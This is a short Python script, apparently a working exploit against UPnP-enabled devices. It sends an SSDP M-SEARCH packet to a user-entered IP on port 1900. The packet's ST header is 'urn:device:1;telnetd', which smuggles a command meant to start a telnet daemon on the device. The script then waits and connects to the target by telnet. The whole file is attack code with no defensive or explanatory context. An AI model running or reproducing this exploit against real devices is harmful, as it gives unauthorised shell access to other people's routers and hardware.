import sys
import os
import socket
from time import sleep

def config_payload(ip, port):
	header = "M-SEARCH * HTTP/1.1\n"
	header += "HOST:" + str(ip) + ":" + str(port) + "\n"
	header += "ST:urn:device:1;telnetd\n"
	header += "MX:2\n"
	header += 'MAN:"ssdp:discover"' + "\n\n"
	return header

def send_connection(ip, port, payload):
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
	sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
	sock.sendto(payload, (ip, port))
	sock.close()

if __name__ == "__main__":
	ip = raw_input("IP: ")
	port = 1900

	headers = config_payload(ip, port)
	send_connection(ip, port, headers)
	sleep(5)
	os.system('telnet ' + str(ip))
